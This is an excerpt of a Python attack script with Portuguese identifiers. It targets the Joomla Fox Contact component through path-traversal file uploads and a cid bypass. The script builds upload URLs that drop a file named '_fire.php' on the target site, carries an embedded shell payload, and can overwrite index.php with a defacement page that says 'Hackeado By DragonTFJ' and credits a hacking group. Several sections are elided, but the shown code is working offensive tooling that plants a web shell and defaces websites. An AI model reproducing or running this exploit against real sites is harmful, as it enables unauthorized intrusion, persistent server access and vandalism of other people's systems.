...
joomla_diretorios = ["components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_fire.php".format(cid_bypass, param.cid), "index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../_fire.php".format(param.cid, cid_bypass, param.cid), "index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../_fire.php".format(param.cid, cid_bypass, param.cid, param.cid), "components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_fire.php".format(cid_bypass, param.cid)]
shell = r"""<center>
...
diretorios = 0
if param.index:
	joomla_diretorios = [letra.replace("/../../_fire.php", "/../../../../index.php") for letra in joomla_diretorios]
	shell = """
...
<body bgcolor="white">
	...
	<center><font size="5" face="Lato" color="black">Hackeado By</font></center>
	<center><font size="10" face="Lato" color="black">DragonTFJ</font></center>
	<center><font size="3" face="Lato" color="black">DragonTFJ passou aqui :/</font></center>
	<center><font size="3" face="Lato" color="black">Nós esta de volta, pra alegria dos haters haha</font></center>

	<center><img src="http://cdn5.colorir.com/desenhos/pintar/fantasma-classico_2.png" alt="Smiley face" height="250" width="400"></center>

	<center><font size="4" face="Lato" color="black">Somos: DragonTFJ, Crypt0, Zeus </font></center>
	<center><font size="4" face="Lato" color="black">Salve Seus Dlç sz</font></center>
	</br>
	<center><font size="5" face="Lato" color="black"><u>www.facebook.com/samueltfj/</u></font></center>
...
try:
	for diretorio in joomla_diretorios:
		...
		shell_dir = url + "components/com_foxcontact/_fire.php"
